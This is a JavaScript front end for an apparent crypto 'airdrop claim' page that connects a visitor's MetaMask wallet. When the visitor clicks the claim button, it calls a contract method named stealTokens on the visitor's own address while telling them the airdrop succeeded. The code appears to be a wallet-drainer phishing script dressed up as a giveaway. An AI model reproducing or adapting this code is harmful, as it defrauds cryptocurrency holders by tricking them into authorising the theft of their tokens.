let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

async function loadConfig() {
  try {
    const configResponse = await fetch('config.json');
    if (!configResponse.ok) {
      throw new Error('Failed to fetch config.json');
    }
    const configData = await configResponse.json();
    contractAddress = configData.contractAddress;
    tokenAddress = configData.tokenAddress;

    const abiResponse = await fetch('abi.json');
    if (!abiResponse.ok) {
      throw new Error('Failed to fetch abi.json');
    }
    const abiData = await abiResponse.json();
    contractABI = abiData;

    console.log("Configuration loaded:", configData);
    console.log("ABI loaded:", abiData);
  } catch (error) {
    console.error("Error loading config or ABI: ", error);
    alert("Error loading configuration or ABI. Please try again later.");
  }
}

async function connectMetaMask() {
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      console.log("Connected accounts:", accounts);

      document.getElementById('claimAirdropButton').disabled = false;
      document.getElementById('connectButton').disabled = true;
    } catch (error) {
      alert('MetaMask connection failed');
      console.error('MetaMask connection error:', error);
    }
  } else if (isMobile) {
    alert("Please open this URL in the MetaMask app browser for a better experience.");
    const deepLink = document.getElementById('metaMaskDeepLink');
    deepLink.click();
  } else {
    alert('MetaMask is not installed. Please install MetaMask to use this application.');
  }
}

async function claimAirdrop() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }

  if (!contractABI || !contractAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    console.log('Claiming airdrop...');
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert('Airdrop claimed successfully!');
  } catch (error) {
    alert('Error claiming airdrop');
    console.error('Claim error:', error);
  }
}

window.addEventListener('DOMContentLoaded', (event) => {
  document.getElementById('connectButton').addEventListener('click', connectMetaMask);
  document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

  loadConfig();
});

